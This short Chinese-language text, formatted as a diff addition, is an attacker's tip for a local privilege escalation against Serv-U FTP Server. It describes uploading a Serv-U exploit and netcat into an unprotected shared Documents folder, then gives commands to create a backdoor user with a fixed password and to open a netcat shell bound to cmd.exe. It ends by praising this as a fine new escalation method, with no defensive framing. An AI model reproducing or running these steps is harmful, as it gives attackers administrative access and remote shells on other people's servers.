@@ -1,0 +1,11 @@
+Serv-u Ftp Server 本地权限提升漏洞：   
+很多主机的C:\Documents and Settings\All Users\ Documents目录以及下边几个子目录Documents没有设置权限，导致可以在这个目录上传并运行Exp. 直接上传了serv-u local exploit 和nc, 并且把serv-u的本地提升权限的名字命名为su.exe 文件就放在C:\Documents and Settings\All Users\ Documents, 然后我们用su.exe直接建立用户,也可以反弹一个shell过来的。   
+具体命令：   
+建立用户: serv-u.exe "cmd"   
+>USER xl   
+>PASS 111111  
+
+反弹shell: serv-u.exe "nc.exe -l -p 99 -e cmd.exe"  
+
+很不错的提权新方法 
+
